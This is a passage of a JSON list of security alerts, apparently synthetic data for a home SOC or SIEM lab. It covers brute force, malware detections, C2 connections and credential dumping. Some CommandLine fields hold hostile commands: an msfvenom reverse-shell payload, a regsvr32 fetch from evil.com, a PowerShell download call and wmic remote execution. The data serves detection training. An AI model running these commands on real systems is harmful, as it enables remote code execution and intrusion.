    "TimeGenerated": "2026-04-21T06:00:37.665801",
    "EventType": "PsExec Detected",
    "Severity": "High",
    "EventCode": 7045,
    "UserAccount": "finance.user",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1570",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T11:20:37.665286",
    "EventType": "Privilege Escalation",
    "Severity": "Critical",
    "EventCode": 4672,
    "UserAccount": "finance.user",
    "Computer": "ELK-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1068",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T23:45:37.667458",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "DEV-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "RedLineStealer",
    "FileHash": "deadbeef12345678cafebabe87654321",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T11:08:37.668828",
    "EventType": "IDS Alert",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "172.16.0.100",
    "DestinationIP": "194.165.16.11",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T11:45:37.661316",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "lab.administrator",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T14:27:37.667777",
    "EventType": "Ransomware Activity",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "FIN-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1486",
    "LogSource": "Sysmon / EDR",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T06:59:37.664320",
    "EventType": "Reverse Shell Detected",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "finance.user",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "192.168.56.104",
    "MitreTechnique": "T1059.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Metasploit / Netcat"
  },
  {
    "TimeGenerated": "2026-04-20T07:49:37.668001",
    "EventType": "Impossible Travel",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "jane.smith",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1078.004",
    "LogSource": "Azure AD / Okta",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T11:54:37.661424",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-22T05:27:37.669033",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T06:26:37.667159",
    "EventType": "Credential Dumping",
    "Severity": "Critical",
    "EventCode": 10,
    "UserAccount": "dev.engineer",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon Event ID 10",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": "mimikatz.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T10:22:37.669476",
    "EventType": "Wazuh Alert",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T05:06:37.665877",
    "EventType": "PsExec Detected",
    "Severity": "High",
    "EventCode": 7045,
    "UserAccount": "svc.splunk",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1570",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T19:59:37.668450",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "91.234.56.78",
    "DestinationIP": "172.16.0.100",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T04:30:37.663817",
    "EventType": "Sysmon Image Load",
    "Severity": "High",
    "EventCode": 7,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1055.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "certutil.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T23:38:37.668056",
    "EventType": "Impossible Travel",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "attacker",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1078.004",
    "LogSource": "Azure AD / Okta",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T02:46:37.665206",
    "EventType": "Port Scan Detected",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1046",
    "LogSource": "Firewall / IDS",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Nmap"
  },
  {
    "TimeGenerated": "2026-04-24T10:50:37.665155",
    "EventType": "Port Scan Detected",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1046",
    "LogSource": "Firewall / IDS",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Nmap"
  },
  {
    "TimeGenerated": "2026-04-24T02:13:37.663462",
    "EventType": "Sysmon Network Connection",
    "Severity": "High",
    "EventCode": 3,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "185.220.101.45",
    "MitreTechnique": "T1071.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "rundll32.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T22:03:37.665941",
    "EventType": "WMI Remote Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "finance.user",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1047",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": "wmic /node:TARGET process call create cmd.exe",
    "ProcessName": "wmiprvse.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T23:53:37.668497",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "103.45.78.21",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T10:58:37.667598",
    "EventType": "Process Injection",
    "Severity": "Critical",
    "EventCode": 8,
    "UserAccount": null,
    "Computer": "SPLUNK-VM-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1055",
    "LogSource": "Sysmon Event ID 8",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T05:51:37.662394",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "ubuntu",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-23T16:30:37.663178",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "svc.backup",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T02:23:37.666157",
    "EventType": "C2 Outbound Connection",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "185.220.101.45",
    "MitreTechnique": "T1071.001",
    "LogSource": "Firewall / Sysmon",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T02:46:37.661358",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-20T03:17:37.667433",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "SPLUNK-VM-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "Trojan.GenericKD",
    "FileHash": "deadbeef12345678cafebabe87654321",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T07:00:37.667280",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "SPLUNK-VM-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "Ryuk.Ransomware",
    "FileHash": "0123456789abcdef0123456789abcdef",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T21:34:37.663948",
    "EventType": "Sysmon File Create",
    "Severity": "Medium",
    "EventCode": 11,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1105",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "certutil.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T07:01:37.660168",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "172.16.0.100",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T21:21:37.664936",
    "EventType": "LOLBIN Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "john.doe",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1218",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll",
    "ProcessName": "msiexec.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T09:51:37.664542",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "attacker",
    "Computer": "ELK-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell -c (New-Object Net.WebClient).DownloadFile",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T11:01:37.663669",
    "EventType": "Sysmon Network Connection",
    "Severity": "Medium",
    "EventCode": 3,
    "UserAccount": "john.doe",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "185.220.101.45",
    "MitreTechnique": "T1071.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "wmic.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T12:07:37.667513",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "SPLUNK-VM-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "Mimikatz",
    "FileHash": "a1b2c3d4e5f6789012345678abcdef01",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T12:32:37.661156",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "jane.smith",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "10.0.2.10",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T20:19:37.660521",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "jane.smith",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "10.0.2.15",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T15:49:37.665624",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "lab.administrator",
    "Computer": null,
    "SourceIP": "192.168.56.105",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T02:04:37.668071",
    "EventType": "Impossible Travel",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "svc.backup",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1078.004",
    "LogSource": "Azure AD / Okta",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T07:17:37.661544",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
